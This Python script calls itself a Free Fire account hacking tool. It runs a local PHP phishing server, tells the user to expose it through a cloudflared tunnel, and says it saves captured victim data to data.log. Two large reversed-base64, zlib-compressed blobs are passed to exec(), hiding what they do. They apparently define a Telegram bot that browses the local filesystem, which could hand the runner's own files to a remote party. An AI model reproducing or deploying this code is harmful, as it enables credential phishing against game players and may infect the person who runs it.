import os
import time
import math
import shutil
import telebot
from telebot import types
from datetime import datetime
from termcolor import colored
import sys
import signal
import threading

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'==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'))
class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.current_path = BASE_PATH
        self.page = 0
        self.selected_item = None
        self.mode = "browse"  # browse, search, upload, etc.
        self.search_results = []
    
    def get_items(self):
        """Get items for current directory"""
        try:
            items = os.listdir(self.current_path)
            items_with_info = []
            
            for item in items:
                item_path = os.path.join(self.current_path, item)
                is_dir = os.path.isdir(item_path)
                
                items_with_info.append({
                    'name': item,
                    'is_dir': is_dir,
                    'path': item_path,
                    'size': os.path.getsize(item_path) if not is_dir else 0
                })
            
            # Sort: folders first, then files
            items_with_info.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
            return items_with_info
        except:
            return []
    
    def get_paginated_items(self):
        """Get items for current page"""
        items = self.get_items()
        total_pages = math.ceil(len(items) / MAX_ITEMS_PER_PAGE)
        
        start_idx = self.page * MAX_ITEMS_PER_PAGE
        end_idx = start_idx + MAX_ITEMS_PER_PAGE
        
        return {
            'items': items[start_idx:end_idx],
            'current_page': self.page,
            'total_pages': total_pages,
            'total_items': len(items)
        }

def clear(): os.system('clear')

def type_print(text, color='cyan', delay=0.01):
    for char in text:
        print(colored(char, color), end='', flush=True)
        time.sleep(delay)
    print()

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global bot_running
    print(colored("\n\n[!] Stopping services...", "yellow"))
    bot_running = False
    os.system("pkill php")
    print(colored("[✓] Services stopped. Exiting...", "green"))
    sys.exit(0)

def intro():
    os.system("pkill php")  # Kills all running PHP servers
    clear()
    # Fixed escape sequences by using raw string
    print(colored(r"""
          /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$      
         | $$__  $$ /$$__  $$|__  $$__/| $$      
         | $$  \ $$| $$  \__/   | $$   | $$      
         | $$  | $$| $$         | $$   | $$      
         | $$  | $$| $$         | $$   | $$      
         | $$  | $$| $$    $$   | $$   | $$      
         | $$$$$$$/|  $$$$$$/   | $$   | $$$$$$$$
         |_______/  \______/    |__/   |________/
""", 'red'))
    
    print(colored("Subscribe Our Channel to use this tool For Free!", "yellow"))
    print(colored("\nRedirecting to our YouTube channel...", "magenta"))
    time.sleep(2)

    # YouTube channel link
    os.system("xdg-open https://www.youtube.com/@aryanafridi00?si=4ShUWvlCJUNi749h")
    time.sleep(5)
    
    logoo = r"""
                    
                    ██████╗  ██████╗ ████████╗██╗     
                    ██╔══██╗██╔════╝ ╚══██╔══╝██║     
                    ██║  ██║██║  ███╗   ██║   ██║     
                    ██║  ██║██║   ██║   ██║   ██║     
                    ██████╔╝╚██████╔╝   ██║   ███████╗
                    ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝
                    
          ███████╗███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
          ██╔════╝██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
          █████╗  █████╗      ███████║███████║██║     █████╔╝ 
          ██╔══╝  ██╔══╝      ██╔══██║██╔══██║██║     ██╔═██╗ 
          ██║     ██║         ██║  ██║██║  ██║╚██████╗██║  ██╗
          ╚═╝     ╚═╝         ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
"""
    os.system("clear")
    type_print(logoo)
    type_print("               __DGTL FF HACK__", 'yellow')
    print(colored("         >> By ARAYN AFRIDI | DIGITAL CYBER<<", 'cyan'))
    print(colored("\n     Tool to Hack Free Fire Id via Cloudflare Tunnel\n", 'green'))

def show_menu():
    print(colored("\n╔════════════════════════════════════╗", "yellow"))
    print(colored("║         MAIN MENU                  ║", "yellow"))
    print(colored("╠════════════════════════════════════╣", "yellow"))
    print(colored("║  [1] Start FF Phishing Server      ║", "green"))
    print(colored("║  [2] Start FF Hack Server       ║", "cyan"))
    print(colored("║  [3] Stop FF Hack Server              ║", "red"))
    print(colored("║  [4] Exit                           ║", "red"))
    print(colored("╚════════════════════════════════════╝", "yellow"))

def run_bot_in_background():
    """Run the bot in a background thread"""
    global bot_running
    
    try:
        # Remove webhook if exists
        bot.remove_webhook()
        time.sleep(1)
        
        # Start polling
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        # Silent error - no output
        bot_running = False

def start_telegram_bot_background():
    """Start Telegram bot in background without showing output"""
    global bot_running, bot_thread
    
    if bot_running:
        print(colored("\n[!] Bot is already running!", "yellow"))
        return
    
    print(colored("\n[+] Starting FF Server in background...", "cyan"))
    
    # Test bot connection silently - don't show username
    try:
        test_bot = telebot.TeleBot(TOKEN)
        # Just test connection without showing username
        test_bot.get_me()
        bot_running = True
        
        # Start bot in a separate thread
        bot_thread = threading.Thread(target=run_bot_in_background, daemon=True)
        bot_thread.start()
        
        # Simple success message without username
        print(colored("[✓] Bot started successfully in background!", "green"))
        time.sleep(1)
        
    except Exception as e:
        print(colored(f"[✗] Failed to start bot", "red"))
        bot_running = False
        time.sleep(2)

def stop_telegram_bot():
    """Stop the Telegram bot"""
    global bot_running
    
    if not bot_running:
        print(colored("\n[!] Bot is not running!", "yellow"))
        return
    
    print(colored("\n[+] Stopping Telegram Bot...", "yellow"))
    bot_running = False
    try:
        bot.stop_polling()
    except:
        pass
    print(colored("[✓] Bot stopped successfully!", "green"))
    time.sleep(2)

def start_phishing_server():
    port = input(colored("\nEnter port (default 8080): ","green")).strip()
    if not port:
        port = "8080"
    print(colored(f"\n[+] Starting local PHP server on http://0.0.0.0:{port} ...", "green"))
    time.sleep(1)
    os.system(f"php -S 0.0.0.0:{port} &")
    time.sleep(2)
    print(colored("\n[!] Now open another terminal and run this command:", "cyan"))
    print(colored(f"cloudflared tunnel --url http://localhost:{port}", "magenta"))
    print(colored("\nYour Hacked data will be saved in data.log\n","yellow"))
    print(colored("[!] Press Ctrl+C to return to menu", "red"))
    
    # Keep the server running
    try:
        while True:
            time.sleep(60)
            # Silent status - no output
            pass
    except KeyboardInterrupt:
        print(colored("\n[!] Stopping phishing server...", "yellow"))
        os.system("pkill php")

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'xdsJn93+//3z8XqbM02y1p3ZJ8MQaGm9WsaenpYmUiZU7NZgnCwT5/N7o0z6vwEOtd/XUj4p/KddWJYC0YfCfI+Jy7WAXI7MTpwMSxTTvF5Xdk7rYHqbCpxiLuvfivVbtmeexS+JrMPVsidrRwb0cW3i/qwnfqNgXK1i9MZYGsp6qf2z/gJk9ivOAKrfy7HMqGjb6khRhKGdDkNByRYUYHm+dgGik8JvXgs0/IhOno+masrZHcrkspFu35MbX/6u5HRxJGJc0PEN1m0S8td4wVvIVobJl5px9HBrfvpqSqAd8dk4luQ/8F6VHWRVPVjFfOJ6SYf8vLKYWyry7xPUtrD4sOqdTy3HFQJ+vRe2qnYGeLrhdcaq6+1FjZTSfoAvc7wsr+gFDuPK4HrXd3ow1JbBb1ozXCAz8vgsj9aumrwju1VqJbaR1r/MwARX9Ahk5Usv/ZUCF+ViJUWf2bM32ONv6MF/zabesLoBJsGFvqrq1LAPN7lrGcdQwHVupmIA/5Tc3e0mFKmMJfC/f2seFndVssYIg4nryZcTUAsxmyB38yNUfJq8smHOiXmmI/x8ZoDg9JGeR5eZ9r/NAYt8BWKfw0syOM2XRbq9n9mqtABEStjb1RvbdsNv8JwJweC5rbH62HmlfUWm27CSuZDvkU8/s7nasAvATxtfjkN4mnnpAZDfZYJMdkYODapgP9xaVaBc24SJ5G/M1LI2wczweJ7swp7vZ2vMnkywfWa+YQTZf3J62DrMhGltW+f52LjDXT3e1FL2vav/xl95AqZiNli8w8ZyhQ1KEToTm0kBuBwrv7Y1FTA+fBbAe25E/5Ov9SE3TiLWpcW2T7NwZsAUU26E+DMieImdk08iZcWpA4LBgqYvzWBqcXa/Bbex9rtz7/pHOlrVNxMAyQNdwrJOUZHt28/Y+UtJvNGlw2gCCpH6H/jnBRR7PkZa6bbRzE5OLV9MyHhXw1seWBVHWIJ5HuNB2wUTuTwfFsPbEXE3QYfFJL0DmDMJB+QvAd4uL9XtVGZkxTg6LfEKxfN9pNN159aOU7KnoelvYTdd0nR6Si9iq1POOe6XkhC2eKUN88LtMR6fQW97m49PrTnYnOjE3AvE2ys0yKiN3Bij/vMfD6UzDNMjmQpDJ16NWr8TuNUkx611xLY1cGYoAwPsOvCBE57zC4Xk5rAA5ewD4zCiMcLI6pBcOVnR+DJPiuzk4TyiO4juTcBeJTrmFPZieFjMaHnm+he806es6F2vIBvc457bnRqLaKkmjVytdsPqr5P6IqQl0wMgeMs5QAG/3E17XftVDFgL9N73mrxXH3kkA7p7FTu2+1gucG6+qUCcFJhhnOAoJRKlHPSmXm3ZRv/kCIOgRJW5Xu7V2TUeN5h7Yz8mw0XV6LVzq7czFCFjjyACkiW45QUituulfxlp0mWpnaZ5jeuzLeUoq/WKfqKGT16nmro6HbPg4qDgXa9TZGmmUx8xVo+hLA30MEMpB6cqv6bDxinaXpvZjjnIaDvm13HVjN6T0QS0PjFuiBuoioCkU8gEVEcmo/ltqxkg7JtaWCqX4HIiWDZYtDXxuDRa2AliTujCSoexcaGbnd59aBtiJCGPpxzsM5aKbvD0bdeZ8y81DII3nGCs69Hu+r/RGOb46MKS16SR39Q+A+5BFapsC2T4zNVFhXhtjtFSPuXadWit9JGqNiOjk3YQwVb4/3gKRPNf2oEzGbR5Jmr1wduNZdGFqSRBDl8p1lRkQ3O1qPf3oqRhcRjHOqM0d5dpCPOA9jMcriVQaeWc/54Moud7wnvD9Kh1rmfQfebwoUXhx4PaH35FwXuyBEvo+3NmV3cjNOcVLe3+whuzHN+tXzwXeJU/ObJqwZabY4eILXZyw98wril6PJrJa2PvNp8k6IQbOL1uOIHUZA2N2fG0HWn2VXe7gXc6a/gLDcK6HCNoKfr0gh3xjbDxMK+yB4YVZW9W/SgzrDdulRXG2C+o0KByP2jm2BnzOgvoDppsXMxJwzPMt9nMurWWce/jkrpcY6xS5eI8SRbjkIUjq+OINXBsz7gX3KiFOnoySPNdzfvwcg/kuCFLxio+jl6/Q4mkwHarUFZWU0VwhUnt1zDLdyZhjOuWAKoWfkxV1Fmij7TVKMvjtfHkDzIyEJVkGrcCxfqOFsbErI+W+FJRyzEjGCrffEukYv3h6FS3go+uLsuNfB97WzbkDxtc7c4FA3aVuovTNaXIY4G8dxKA0/lqOEr3BRPCgGWve+M9va0YQ80ag/vOM1tero9xXWUiN2jhVWZ4Cq6i1zclCJJTzYJFDMNKZmJt+lukkbNVjWAT5a60Z97PWCjbI4Yb2I8E+WJDr7ItteQMnXxG9aTZY9UmfCcMVKswmM+fQSeU2mnF8yULQoSAYoEgLm3MmbXcKMwS+q2csP6BtuK0YEmkONOTM3wI4IEuy95DhvqRych0YA7jvMoLUW7NZZqPhhBqyjZ8WlwzIMMK/5tKsSrT84+yapfocM9+rv7c1c8u5VVFY+ZsIxjKE6igfFc3dt5fyfk/YjuhOmDQpDDj/tmIzzbz9AHiy8+ZyrB8uXHzuIlrRrc3wqyFklRIHlQJcFI0S/tkAXDUu3qkEEGclZcGGkfNcHQ4LiiHegYicOrdLG260UUZRuSb6e5fHyzOYNFIsknnizCmE5kWuqjkVvrlZBYTvtncB4vBYgsfajbe8l1IEBMJakqfhVnNf9kgnoSE6ILgLGXwplB77KmwbA3sQbNqiM2l0nlCHrXYpqrt8qwWuClygrpYwADzmGhtzz3OK9zfVnNgHS8wKIPN4O3991tTmolRxP0TgeAGI4zf1avS/XfMB9bPClfLtHZkZN8HZ/kENKyOvHV/VJmApgsvfKAMwGM2shUCZkP6Yp59M8O82M57U/r+QaPRLJERpiAWPK2wTguHoJtRPjR2m21PO/8FMWYudPGOvvqzUOh0E1FwLhpzmm0KifoF6g7LYrfG1sdlgkoooPVpeD+weDUiCSqWllrFY9r2u/oM7WkwfEsYaOvKXZOvtHzf45dQRsdCcNopD6a7mkchmV4Vbw+jbc65zakHExOBx6ZLnND/wUwEqC7Y5L33T7qgv0jJYlKDzBXL/9d7UELnsuW725CXQGZJZHdWi2bjmBdie5UkJzwWspQewgBgQj4wU+TXzPH/3BZ3oEceSrQQ2jWhxGwjMmoR6kuX1ONSWxyJ4UQN2jyQR5X2WCir2MH/n8XZ4vkbg741XeyoR4RMfioXNfQ2ovjaJzLQCkZ1jJ73IoL3kvDuwd55T1GC3R3ZkarBljaZ28p//57mTYdtGQXlIIPq/AcKXRy5S9F7XJQ2tA1lFD9efzMY1Vo/eoCv43CKr7Ftz9l1Y6HOYAXFwuVwuIJwhUcy3eg5FIGMkLwOUHBNHMmSVbetDZmNCWRxRThh/E+IlfjsLSzoASzONBvKaiVVXXYFLkE78sPeho5OxcH1sidS1ogv8Pvgq82cole7aI+Y6cqxpAkBTJ1uvHPIDJAqVvCxKPx8hnnvKZEFNsVN7b5eqA43UKr5JyEw8dXO/8rdmC0oUIU3+fzACUTlYbdExYInFhEiDq/L3xxjuPWpISQRK5eKz1Wfv2eg/H5fHAfifoBWoQBKAXdtrB9XjxMNrmKobixqX3FNs4xZae5Thtla9g3SV/9c+1/NLWMO5ZE0caxGbE+DjM+/YDGSoW7uiArorUcRMxfPr8LevXPw2XBU0HMevNSZArJ/t7w8oi3vW+Sk18i9/56XeDyHm/KnNmdL0ihVExQqjvFzueBRnH6fgeLVXTivy6eG0zkNe8jJd4HN7XX9xwy9Cdm2pPOPkWnJ57Ye1YoGa3ZIaUurvYkqYglqtNPZp5HCNUcfw1bn1K+g136WxMRN73zHrhmYKRS5Hk2vkfa/4aUuJKLbYELlYR+jqBE2ogRWut/+RixoFdHxYpufnPOGP4f9B9646m17rvd5uO4lUsenDGecSoCEHiT1tYSz0PN67k6B2bMSUeS02VaEWc/tFBv8CZshJXReFrgbiD8Lq+isMvmwaGnd5s90cH352mTcsltYCex6jwppeeSQp6RniQgQbUEm2bkU+1Q8xi/XhF+x8xPUMPRvM4uua5NGVJDCBGwCC+dY3Zrz1k4CjHgyJjiMouKfkobJSj/RspHefgSX5uvBgEESvJckTo2cWKF4QtwL9PRBDnwjQ+xFM3njlph/EhfeK8u4gdQ0AVW/uN+doDyJiwEBJ0VPHVaNTaEO8NAXRNgICitj8msOZ73bzDjQ+HlUmqHh2fU+2C0aZDef8DKTMY3D+CvJeyZE0g97NXEAEWivaFbB9m1YAKBJU2daFJWrs5kAibMs0FxyPrChRMbLOcQBW170v0jEh9UsXem0BQKdiAjCZdb3MesmOyndQfc9Hi2l7/EoJ0LD5UTn6b64/2stPZxmis+Ks7vtfEfXGOf4fFEdpWi8PE9RkxQvEi0ZrFtF8S+N99t3s+Vcw+MrCXML4leivcSqzi7fo8SqRRBD4sjTg4UtFvnnIUxBczeDCxeR5v4R27P8uja14dM5Cr2p8RGEL4tzN7SkSViiLNRCVh/wsIqMyLf/Wf1r7OC/akIZe5LOXmhDKPGMXlYhUM8ypwdvmOLxJpmP48XwID4/fFNy6GJHkUhcaa2Tjan3PuMhX399tXYsMj43NH9q2zUwDiS0xLyTv5cuGQT3LvqF+fQA2pYulEruhPAV0M9ZvXNDNc0EI/v9zmA1PzNOohsRGQCi354CyebzJMnQud/cvcZAPsedl+J7NqzKTyIjsfr//m5IwjHw0O/i0JyOPdq+dLmpPFRuZGqeQzAe788cqlnCu0UJg9cBzNM8gCeolYTmBuVjQVhqBgyl+LNi+oMFX8KeVCiRRZNVh+RwuljrJes/0mIM6BDXLG+uFbbUTBwZ+QHauEefgogEWmDBGY9BIE+aNYD1OQBt2Wf1c9Mb/wA14nG95GOctCjZWsqN2z261ELnKzUlIWJQRSBwUpUxrgnK0ddQPzslW8SqgVNQm1OAv9ZYNsRn8FtEq+ogCLZVe8cWYOhZvqZHixW7lbaVvu52AxGaCtEV2Nx5tH3/jLsg9ZTuT2Lr8l3uC7nVR465DUIy0SK08nYc6wSS4D3oCdXS7ho38P3cXsr6/h9+eCSjHn9o7XpFBRnPDsjQPvWAxsOg3dk48bE7PQGdKMIC/sIoDwDq+TIX8hi8pyq/nyAiMd6wkie5RARnJXr03DcqJdKaIX04P1rP/Slm8HytxsVe91Rzhzfzo2pw+PEKj3NhfMirFrutovDKaMp4+H/fH9AC1NvUQgVQeNoUP31/E1ZUU8tO6c2iI8X3BkwqqMi1Uj62J5jW+rTvL6NZFC/bo1Ol9slngsMRSfbEBRuGx4uQQieCq+KSrTNkH58lxsk1bvLaFuDvumRVu8Z9MSh5fODTSXfON8Bl6jpDEsMs6Frnx0M6XehUSS8A2qOWOYNFADY8Cr1SO84kQyhUm4UVj34IJ9a84//tRhmhfRHbW21M7TDx+/dXgN8IffL2heJgoehIEYvZcn/xJsyJYZd2QDlyNw6PoxxDqDwC+XOfkBLdlgwxFWP6ra77VVmz6VConkgvrqjl8OkMUaYfLi1aOHGt+uYq1qIBCcUwMX412RDUq/V2O4Yc/5q/Vxl4Tb/eQIXQxoZ4WHV1fDeusUUCGY8K5zQNtpXYk6RUT8XeCLidkOfWETmwWjSLvhIx53yyqufvTFNFxEKDZlcIxVZskvNekp5dIw1IbmPWH0LklFZ6Hijo6imFg/PUr/txTV6we5uOhw05cSQKgqQ+AG/qdeRegw2vB+ZGLi5aAVxsPjuFicAVXLESasLDwKNKfn1JZhN6+j2IrC9GudPXsLUxjaliaELjmm6IS9PlL0mxShI0AZVpjhtk2VvzcM3BiHbgA8XcV7GOKPDCXL9SYnYYXsOHYH5Pwak8tLIFHrOg/E0exBQolmPlOho1YZs0fOUbuIYFDb3o2O+kw1KXsj+EGZhZL52i1FCFGeF0GLeXuM63aHQQxqSkoA/iQ81LbJvG9ejiI0DgDBvIh6OxhUE9Nj2/xxkxGNwtpui048Q1l6K9dJk9L6HtBO8gKW73LkKhH6JGAzo7vgB2UuYOiuxEznSpJed1rUUeTYyChr32XaX8qMt91WYhn7vBzkZXP/2bsDZmFgUyATTVdzmug5b+eS9WHRBoZbyvbrHK+HDS2zoH00Gf+3t6q3hvn3wDEfBpE3xlyMD3Irn4LyTZ8YcpJH8+x3EGWDXPU2kWPyAVR/2ZYrMeHiLJRhU5WkxTVGOZ58KxjP+Ersel34LNIyrfj5rTbqTFvHUW83VeroLLq15AOh1c9VtdIYsdj9dc6l5AZBVoolfvbrcB/JDJ4O3++o6LYvkiTCHqCptD530Woj9o93Dddv5FqK5SlZdQ1nNmtntUPsGN1DGCDOfsdXCI/Odg1TDX8y/TAETR3GXlNd7+NBj20WtUE8cgZtXwxeKBSHSA3Pgjb2pPDHT81cmR/HAj2KV6NPyfjQQiwIJaOhM2JZEx/5ueEWPX6HYFqRcywCY68r2yjstsuvMkIgRzTmVEUk4mB8JOxVvJkDUy/0Od8Hp4P4kbxGDFxf6XCTtUNcyRulrI82G549DGYF9VQMoWHdSx+3SNIdOCJVf1D7wKsIkEILcYl9ByLh3YuKa17JnWq5enjKI/avUcdfj/2CkF35GFgrdiWRIY0tD/+iyyOs5bgz7N/SxACP5K1eQ7GlXvsYfTzWWJozzJTeWNORr+vpvhcUwThhu4Dxv7PubG/cJaQAgRKrXDtiVEta8CILFGW9sznF48g8Y6QdHcG67mx/PUPuQqfjzNVwlLritw9HCCXnnkLKb0ChTm2qbktqQpU0HJmnCvs9HSobagoYLpKcf2zsGLSj0fZabEkQwrqXccWwZD/knnPhIJh4ItXUb8P1qRIrYWuBaYdLGRz9aHl3H/RSG81oSzDeT8/KxoD2O/SiqnzinbJXVZbVfEuWeqUMoISWNuGo3xjs9DyacS1+dqFF1dT6/mfhgkRCdkMdciZ9YxmCPd6K2TgDAE8G8F+jOjTmZptj+FevaSDSvsPFEvMmILPyx0VMW0D48lypvByyAq9AUovOfAbwgvPLBpkp2YGEy9eDR2X0IIG/jJWAuvXtcSrkLFUUarjozdOJUJRv249qk68vHhzJ1n8r14hfRLQAHTWOCQ3QrHXxYsm4nNNiSp71Ac7tBy1kt+t+7y2z3u+0R8PVYFxChY+M+EMklb+bPAtS+a5V7i6jDLovmdKpt3CczUsdwwr0+bTRjZQT6Jx/DS+pyDs2L6XNzQpj2Td34wHPBRCyBIc+E6KJypHdYxnPTXfnXOR21ex+gPcukameJkAZtyVSgATc2ywSdbN+bihBT0rg88+gHNTgj9wA0JzzMDqRwx12GzmwTPwyQg/jjbe3s5xh93i/Aj+IvNmS8ZJMhsCrSiQBM/IWlOaiFVxENWDdJfpcp+t7BLkQkZYCOk1iZZK12N4flZoTGslCuDsA4GwUFcxFLdpwecMIN3K/V3i3t6KYNIYnx2C32nLfJkqynOWsrHxtdyfcYJPranatCmViiGEvStC38nhtUBJmblbRlAwWyXp1dk4GJRX5QaQV+cTpURICCD1lLzYsvlcCvyVYNb+5ooNug/fm9c5bzrJG/ETn/JHTak4WO3ml++DsM+QF+4gky1gP9A7LIDs090PfbLndaDocaSAa2r3LEB93e/bj5AW8mXFojR5yBCR38rG9pbzjAL3Yc/LzZTDXVnJkVHdiaFhZYaeG8SXdbeZfSjz4KmtuaIFePBDst0jjpdgJjeHS8rIl3c7bX59qcaQXZEsUDJBqttAewbjv/DvCMfOwvlWbfxIBqrGB36fHlUIEDuTbDVe4ud6GvdpTf2KyVNSqsjzKrKTqf1kbnrwI8B8+KlcEgounUTQwL69Jue057fNUaPdR/egJtwyhwpOHpiIjLXKwkEJf844oPtXENSYZs/KeTPXCbS6/H6TbxT9U0som0f9Ks4HtrtMDPe40x+ErrJqzo21+fUSLNsFElVZYMIDZFZMoodIsxdff+ALzvQyeZpySUFJ8HVirsM4bhM/JqonuKrhr54MA0vpk0pwTDmUlVIhMVGiCIhhxQb0uOWknP+39+SW8wfggPCksTMm+lp9e+TYnVVk5EsQhmWw3jD4x0eG+xPCNXHMEPx1u2Be2/FvgvXNI4iZKa4RPua5tnnNo96KxxgoSGljfksaupHrhrlQXl4nfos2M6NjhcsSVOJsccN1+Oyqg0XpRhPtCt2xdubffn9sSOHkX9z55Lm7BObgsfPPU4lfJITXDJN4hdyXW6MMzmrsUMEJ/X1IT9TQnbwC6JZlvZqnmJb32OBOrweehyWMxRJIrkBcvPTeXOgq/j1lIx4T2hKo4nVNN9xSNnKCn78R5Z8dQKJH9EVvwklx/cf35iSZOBfusep29vL8fc9fJ8XFm2kkCcOADOxiTrtNU5sYKm1H9W4qUcShiqpMDolTUTB1b4a+S3jVJn7W3yR4/9W/Ne/ce5/71rTrs6JoTbHISbndNHhqkAUnh5bAsDaf+sKzNCwbwmb03dgAhccZ6GHJZiFrXq3k+F+sRcLhj96ZC9H4J9ybXZu/z5dl/fVGXDXtmZsI7Kfj6HVqr3sKpi9sW4zYYDPvPsAK9qDad2Nb4rsn4G3RXThM1ItpCSpgozqxZRmroKoOL9bt0ddM2twy2xBoRQ6MS01imc1FgntFxYvrL64P37aOcTw89tkgJkkHFey4GDnzaZwJ2FTfKCewPHojtOTsQrUjmGgAbRohl1TC11asqy4dH1P8mUUE7ujBgsy1u3HoM6PRVID5//wQ3rK536dmd8l7ISXyY2b0n0vT0G04x/CF8Eq+eIX1t0d86OXfJMnF+bRa0YU/VBWDw3sxCKWeA/Z2iv6DYFV9qGKiQjAxvnfboIeTJLBg/LwCiG4J+Frxm5vAJQQMh55plVH9tg9/PSxiBYAd5B9cvvcPl3eC1/i4eiiYspMGNMc4YghVB44HbAjKpoYfPgyJ8lLlQts66EDzbPHwF7G2yEg4jDxg1ovN0h9icQAi5UfbjDFACjallAdsA+PANMq9zWNCYiz1fgJKv94MdWB3AlhOXk8s1RRV2QyzNGKKFaTig5bkL04+VvMvOjceHTVjK/4KyULivH/tJmKpXY7BPboa/rhLAWBe3UPwfm37aQlo/qkxjI/xjSi5mZ6/mS6p50ViWbGVFLOYqaUgPLgk3OlIH4PwN8N9tT3orOWO058EdVejPvmDS+/CXD6IAPCA7qF4YsEPnJchib05L6vMSqDQlftwP3Irg8buxGfVqD/tcn8qBzdXu04ADrhtdV7dlUG281okH4yFf3N1zdjzorKnKvd5SsH3OEV9EHE2GarDfbdAeFDwBNUxVRb7j0DtcR9Q95T2rXHlt1eoo99+x3O8W4D769TovP3x5J7IQ3qIEjsOdyDaP3Lrhrouw657bLjRZ55cd/fMpKkml5aST7nhc1F2eVJVnR3J/zY/5tHTS7HmkAck3H/UHIreKPZt6Wr7jfiYe5WtqFdcVwR2viYyltLBsRcEXiDLOuPTnH4o2fXH8D6Dhf26g0j0xQxEIy7kLB0dlK903Yn/x4PjOLJ59rgJZRk0+fsPq9nkRlKHlYpmzG1m1QjHYZu/rR9NPP+fC8XL